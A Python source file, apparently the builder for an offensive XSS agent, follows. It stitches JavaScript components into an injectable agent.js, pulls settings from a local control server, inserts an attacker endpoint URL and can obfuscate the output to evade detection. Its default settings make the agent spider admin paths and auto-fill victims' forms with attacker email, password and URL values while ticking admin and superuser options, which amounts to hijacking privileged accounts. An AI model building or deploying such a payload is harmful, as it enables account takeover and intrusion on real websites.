import requests
import subprocess
import time

from jsmin import jsmin

class builder:

    BASE_URL=""
    JSLIB_LIMIT_OF_VISITED_URLS= 30
    JSLIB_GETREMOTESETTINGS_INTERVAL = 5000
    JSLIB_GETMODIFIEDFORMS_INTERVAL = 3000
    JSLIB_DEFAULT_SETTINGS = ""
    
    minify_switch = False
    obfuscate_switch = False

    def __init__(self, minify_switch, obfuscate_switch):
        self.minify_switch = minify_switch
        self.obfuscate_switch = obfuscate_switch
        self.path="/agent/"
    
    def retrieve_remote_settings(self):
        try:
            r = requests.get("http://127.0.0.1:4040/api/patterns/client")
            return r.content.decode("utf-8")
        except:
            return self.JSLIB_DEFAULT_SETTINGS

    def retrieve_remote_components(self, fileName):
        f = open(fileName, 'r')
        data = f.read()
        f.close()
        return data

    def replace_variables(self, js_content):
        remote_settings = self.retrieve_remote_settings()
        if remote_settings:
            js_content = js_content.replace("{ ENDPOINT_SETTINGS }",remote_settings)
            
        js_content = js_content.replace("{ ENDPOINT_URL }",self.BASE_URL).replace("{ JSLIB_LIMIT_OF_VISITED_URLS }", str(self.JSLIB_LIMIT_OF_VISITED_URLS) ).replace("{ JSLIB_GETREMOTESETTINGS_INTERVAL }", str(self.JSLIB_GETREMOTESETTINGS_INTERVAL)).replace("{ JSLIB_GETMODIFIEDFORMS_INTERVAL }", str(self.JSLIB_GETMODIFIEDFORMS_INTERVAL))
        
        return js_content.replace("\r\n","\n")
        
    def combine_ajax_iframe_mode(self):
        components = [ "common/credits.txt", "common/vars.js",
                      "common/settings-utils.js", "common/pivot-utils.part1.js"]
        js_content=""
        for component in components:
            js_content += self.retrieve_remote_components(self.path+component)    
    
        components = [ "ajax-based/prefix-main.ajax.txt", "common/link-utils.js",
                      "ajax-based/link-utils.ajax.js", "common/spider-utils.js", "common/pivot-utils.part2.js",
                      "ajax-based/pivot-utils.ajax.js",  "common/input-utils.js",
                      "common/form-utils.js","ajax-based/main.ajax.js"]
        for component in components:
            js_content += self.retrieve_remote_components(self.path+component)
            
        components = [ "iframe-based/prefix-main.iframe.txt",
                      "iframe-based/link-utils.iframe.js",
                      "common/link-utils.js", "common/spider-utils.js", "common/pivot-utils.part2.js",
                      "iframe-based/pivot-utils.iframe.js", "common/input-utils.js", "common/form-utils.js",
                      "iframe-based/core.iframe.js", "iframe-based/main.iframe.js"]
        for component in components:
            js_content += self.retrieve_remote_components(self.path+component)    

        components = [ "common/sufix-main.txt" ]
        for component in components:
            js_content += self.retrieve_remote_components(self.path+component)            
        
        if js_content:
            
            js_content = self.replace_variables(js_content)
        
            self.write_lib_to_disk(self.path+"agent.js", js_content)
            
            if self.minify_switch:
                min_js_content = self.minify(js_content)
                self.write_lib_to_disk(self.path+"agent.js", min_js_content)
            
            if self.obfuscate_switch:
                time.sleep(5)
                js_content = self.obfuscate(self.path+"agent.js", "agent.js")
        
        
    def combine_ajax_mode(self):
        components = [ "common/credits.txt", "common/vars.js", "common/settings-utils.js", "common/pivot-utils.part1.js", "ajax-based/prefix-main.ajax.txt", "common/link-utils.js", "ajax-based/link-utils.ajax.js", "common/spider-utils.js", "common/pivot-utils.part2.js", "ajax-based/pivot-utils.ajax.js",  "common/input-utils.js","common/form-utils.js","ajax-based/main.ajax.js","common/sufix-main.txt"]
        js_content=""
        for component in components:
            js_content += self.retrieve_remote_components(self.path+component)
        
        if js_content:
            
            js_content = self.replace_variables(js_content)
        
            self.write_lib_to_disk(self.path+"agent.js", js_content)
            
            if self.minify_switch:
                min_js_content = self.minify(js_content)
                self.write_lib_to_disk(self.path+"agent.js", min_js_content)
            
            if self.obfuscate_switch:
                time.sleep(5)
                js_content = self.obfuscate(self.path+"agent.js", "agent.js")
        
        
    def combine_iframe_mode(self):
        components = [ "common/credits.txt", "common/vars.js", "common/settings-utils.js", "common/pivot-utils.part1.js", "iframe-based/prefix-main.iframe.txt",  "iframe-based/link-utils.iframe.js", "common/link-utils.js", "common/spider-utils.js", "common/pivot-utils.part2.js", "iframe-based/pivot-utils.iframe.js", "common/input-utils.js", "common/form-utils.js", "iframe-based/core.iframe.js", "iframe-based/main.iframe.js", "common/sufix-main.txt" ]
        js_content=""
        for component in components:
            js_content += self.retrieve_remote_components(self.path+component)
        
        if js_content:
    
            js_content = self.replace_variables(js_content)
    
            self.write_lib_to_disk(self.path+"agent.js", js_content)
            
            if self.minify_switch:
                min_js_content = self.minify(js_content)
                self.write_lib_to_disk(self.path+"agent.js", min_js_content)
            
            if self.obfuscate_switch:
                time.sleep(5)
                js_content = self.obfuscate(self.path+"agent.js", self.path+"agent.js")
        
        
    def minify(self, js_content):
        return jsmin(js_content)        
        
    def obfuscate(self, input_filename, output_filename):        
        command = f'npx javascript-obfuscator /agent/agent.js --output /agent/agent.js'
        result = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result.stdout.read()
        result.stderr.read()
        return
   
    def write_lib_to_disk(self, filename, js_content):
        with open(filename, 'w') as js_file:
            js_file.write(js_content)

def get_file():
    f = open('/agent/agent.js', 'r')
    data = f.read()
    f.close()
    return data

# to enable minify and obfuscate swithes you need to install npx and pip3 install jsmin
def download(mode, minify, obfuscated, BASE_URL, limit):
    JSLIB_DEFAULT_SETTINGS = """{
        "injectasitgoes":false,
        "seeds":["/admin","/memberadmin","/admn","/bb-admin","/adminpanel","/webadmin","/moderator","/account"],
        "blacklist": ["contact","login","authe","reset","regis","setlan","logout"],
        "inputs": [{
            "name": "url",
            "regex": "link|url|enlace",
            "value": "https://hackerurl"
        }, {
            "name": "phone",
            "regex": "phone|telefono",
            "value": "111222333"
        }, {
            "name": "ip",
            "regex": "ip",
            "value": "IP ATTACKER"
        }, {
            "value": "hacker@email.com",
            "name": "email",
            "regex": "email"
        }, {
            "regex": "pass|contr",
            "value": "HACKERPASSW0RD",
            "name": "password"
        }, {
            "name": "radio",
            "regex": "admin|super"
        }, {
            "name": "checkbox",
            "regex": "admin|super"
        }, {
            "name": "select-one",
            "regex": "admin|super"
        }]
    }
    """

    build = builder(minify, obfuscated)

    build.BASE_URL = BASE_URL
    build.JSLIB_LIMIT_OF_VISITED_URLS = limit
    build.JSLIB_GETREMOTESETTINGS_INTERVAL = 5000
    build.JSLIB_GETMODIFIEDFORMS_INTERVAL = 3000
    build.JSLIB_DEFAULT_SETTINGS = JSLIB_DEFAULT_SETTINGS

    if mode == "iframe":
        build.combine_iframe_mode()

    if mode == "ajax":
        build.combine_ajax_mode()

    if mode == "iframeAJAX":
        build.combine_ajax_iframe_mode()

    data = get_file()

    return data